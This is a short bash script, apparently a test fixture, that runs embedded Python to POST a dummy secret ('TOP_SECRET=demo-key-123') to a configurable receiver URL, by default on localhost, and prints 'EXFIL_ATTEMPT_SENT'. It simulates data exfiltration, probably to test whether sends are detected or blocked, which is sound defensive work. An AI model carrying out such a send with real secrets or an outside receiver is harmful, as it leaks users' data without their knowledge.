#!/usr/bin/env bash
set -euo pipefail

RECEIVER_URL="${RECEIVER_URL:-http://127.0.0.1:8081}"

python3 - <<'PY' "$RECEIVER_URL"
import sys
import urllib.request

receiver_url = sys.argv[1]
payload = b"TOP_SECRET=demo-key-123"
request = urllib.request.Request(receiver_url, data=payload, method="POST")
with urllib.request.urlopen(request, timeout=2) as response:
    response.read()
print("EXFIL_ATTEMPT_SENT")
PY
